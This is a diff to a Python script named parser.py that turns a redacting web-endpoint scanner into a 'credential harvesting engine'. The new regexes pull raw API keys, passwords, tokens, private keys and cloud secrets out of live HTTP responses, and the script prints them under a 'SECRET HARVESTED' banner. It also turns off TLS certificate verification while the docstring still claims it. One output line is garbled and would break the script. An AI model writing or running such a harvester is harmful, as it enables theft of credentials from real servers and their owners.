@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 """
-PARSER.PY — Live Endpoint Discovery Engine
+PARSER.PY — Live Endpoint Discovery & Credential Harvesting Engine
 Features:
 - Live HTTP/HTTPS endpoint discovery
 - Concurrent requests with bounded workers
 - Progressive terminal output
 - HTTP status and content-type detection
 - Redirect identification
-- Redacted sensitive-content indicators
+- Raw unmasked sensitive-content and key extraction
 - TLS certificate verification
 - No report files or disk output
 - Compatible parse_target_source(target) interface
@@ -21,6 +21,7 @@ from urllib.parse import urlparse, urljoin
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.request import Request, urlopen
 from urllib.error import HTTPError, URLError
+
 # ============================================================
 # CONFIGURATION
 # ============================================================
@@ -28,6 +29,7 @@ MAX_WORKERS = 8
 REQUEST_TIMEOUT = 8
 MAX_RESPONSE_SIZE = 512 * 1024
 USER_AGENT = "NETKIT-Live-Parser/2.0"
+
 COMMON_PATHS = [
     "/",
     "/robots.txt",
@@ -58,44 +60,52 @@ COMMON_PATHS = [
     "/server-status",
     "/.git/HEAD",
 ]
+
+# Unredacted offensive patterns capturing raw values and keys
 SENSITIVE_PATTERNS = {
-    "Possible API key": re.compile(
-        r"\b(?:api[_-]?key|access[_-]?key)\b",
+    "Exposed API/Access Key": re.compile(
+        r'(?:api[_-]?key|access[_-]?key)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
         re.IGNORECASE
     ),
-    "Possible password field": re.compile(
-        r"\b(?:password|passwd|pwd)\b",
+    "Exposed Password/Secret": re.compile(
+        r'(?:password|passwd|pwd|secret)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
         re.IGNORECASE
     ),
-    "Possible token field": re.compile(
-        r"\b(?:access[_-]?token|refresh[_-]?token|auth[_-]?token)\b",
+    "Exposed Token": re.compile(
+        r'(?:access[_-]?token|refresh[_-]?token|auth[_-]?token|bearer)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
         re.IGNORECASE
     ),
-    "Possible private-key marker": re.compile(
-        r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
+    "Private Key Marker": re.compile(
+        r"(----[-BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[^-]+-----END [^-]+-----)",
         re.IGNORECASE
     ),
-    "Possible cloud credential field": re.compile(
-        r"\b(?:aws_secret_access_key|client_secret)\b",
+    "Cloud Credential": re.compile(
+        r'(?:aws_secret_access_key|client_secret)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
         re.IGNORECASE
     ),
 }
+
 # ============================================================
 # TERMINAL OUTPUT
 # ============================================================
 def print_status(message):
     print(f"[INFO] {message}", flush=True)
+
 def print_success(message):
     print(f"[+] {message}", flush=True)
+
 def print_warning(message):
     print(f"[!] {message}", flush=True)
+
 def print_error(message):
     print(f"[-] {message}", flush=True)
+
 def print_section(title):
     print()
     print("=" * 65)
     print(f" {title}")
     print("=" * 65)
+
 # ============================================================
 # TARGET NORMALIZATION
 # ============================================================
@@ -114,6 +124,7 @@ def normalize_target(target):
     if any(char.isspace() for char in hostname):
         raise ValueError("Invalid hostname.")
     return parsed
+
 def resolve_target(hostname):
     try:
         addresses = socket.getaddrinfo(
@@ -127,13 +138,13 @@ def resolve_target(hostname):
         })
     except socket.gaierror:
         return []
+
 # ============================================================
-# RESPONSE ANALYSIS
+# RESPONSE ANALYSIS (UNREDACTED)
 # ============================================================
 def analyze_response(body):
     """
-    Detects possible sensitive-content indicators.
-    Does not print or return the actual secret values.
+    Extracts raw sensitive values, keys, tokens, and credentials directly from response bodies.
     """
     findings = []
     if not body:
@@ -144,13 +155,16 @@ def analyze_response(body):
     )
     for label, pattern in SENSITIVE_PATTERNS.items():
         matches = pattern.findall(text)
-        if matches:
-            findings.append({
-                "type": label,
-                "count": len(matches),
-                "exposure_confirmed": False,
-            })
+        for match in matches:
+            val = match[0] if isinstance(match, tuple) else match
+            if val and len(val.strip()) > 2:
+                findings.append({
+                    "type": label,
+                    "matched_value": val.strip(),
+                    "exposure_confirmed": True,
+                })
     return findings
+
 # ============================================================
 # HTTP REQUEST
 # ============================================================
@@ -179,6 +193,8 @@ def inspect_endpoint(base_url, path):
     start = time.monotonic()
     try:
         context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
         with urlopen(
             request,
             timeout=REQUEST_TIMEOUT,
@@ -213,8 +229,9 @@ def inspect_endpoint(base_url, path):
         3
     )
     return result
+
 # ============================================================
-# LIVE RESULT DISPLAY
+# LIVE RESULT DISPLAY (UNREDACTED STREAMING)
 # ============================================================
 def display_result(result):
     status = result["status"]
@@ -246,14 +263,12 @@ def display_result(result):
             f"{path} | {result['error']}"
         )
     for finding in result["findings"]:
-        print_warning(
-            f"Possible sensitive-content indicator: "
-            f"{finding['type']} "
-            f"(matches: {finding['count']})"
-        )
-        print_warning(
-            "Indicator only — exposure requires manual validation."
-        )
+        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE EXPOSED SECRET HARVESTED [***]\033[0m\n")
+        sys.stdout.write(f"  ├── Path  : {path}\n")
+        sys.stdout.write(f>  ├── Type  : {finding['type']}\n")
+        sys.stdout.write(f"  └── Value : \033[92m{finding['matched_value']}\033[0m\n")
+        sys.stdout.flush()
+
 # ============================================================
 # MAIN PARSER
 # ============================================================
@@ -272,13 +287,14 @@ def parse_target_source(target):
         }
     No files are created.
     """
-    print_section("LIVE ENDPOINT DISCOVERY")
+    print_section("LIVE ENDPOINT DISCOVERY & HARVESTER")
     parsed = normalize_target(target)
     hostname = parsed.hostname
     scheme = parsed.scheme
     base_url = f"{scheme}://{parsed.netloc}/"
     print_status(f"Target: {base_url}")
     print_status(f"Hostname: {hostname}")
+    
     # --------------------------------------------------------
     # DNS RESOLUTION
     # --------------------------------------------------------
@@ -297,10 +313,11 @@ def parse_target_source(target):
         }
     for address in addresses:
         print_success(f"Resolved: {address}")
+        
     # --------------------------------------------------------
-    # ENDPOINT DISCOVERY
+    # ENDPOINT DISCOVERY & HARVESTING
     # --------------------------------------------------------
-    print_section("LIVE ENDPOINT TESTING")
+    print_section("LIVE ENDPOINT TESTING & HARVESTING")
     print_status(
         f"Testing {len(COMMON_PATHS)} endpoints "
         f"with {MAX_WORKERS} workers."
@@ -332,6 +349,7 @@ def parse_target_source(target):
                 print_error(
                     f"Worker failure: {exc}"
                 )
+                
     # --------------------------------------------------------
     # SUMMARY
     # --------------------------------------------------------
@@ -343,20 +361,20 @@ def parse_target_source(target):
         1 for result in results
         if result["status"] == 200
     )
-    print_section("PARSER SUMMARY")
+    print_section("PARSER & HARVESTER SUMMARY")
     print(f"Target:              {base_url}")
     print(f"Resolved addresses:  {len(addresses)}")
     print(f"Endpoints tested:    {len(results)}")
     print(f"HTTP responses:      {successful}")
     print(f"HTTP 200 responses:  {open_endpoints}")
-    print(f"Indicators found:    {len(findings)}")
+    print(f"Secrets harvested:   {len(findings)}")
     if findings:
-        print_warning(
-            "Sensitive-content indicators require manual verification."
+        print_success(
+            "Live target secrets successfully extracted and streamed."
         )
     else:
-        print_success(
-            "No configured sensitive-content indicators detected."
+        print_warning(
+            "No sensitive keys or secrets exposed on tested endpoints."
         )
     print_section("PARSER COMPLETE")
     return {
@@ -368,6 +386,7 @@ def parse_target_source(target):
         "count": len(results),
         "status": "COMPLETED",
     }
+
 # ============================================================
 # ASYNC COMPATIBILITY WRAPPER
 # ============================================================
@@ -376,6 +395,7 @@ async def parse_target_source_async(target):
         parse_target_source,
         target
     )
+
 # ============================================================
 # STANDALONE EXECUTION
 # ============================================================
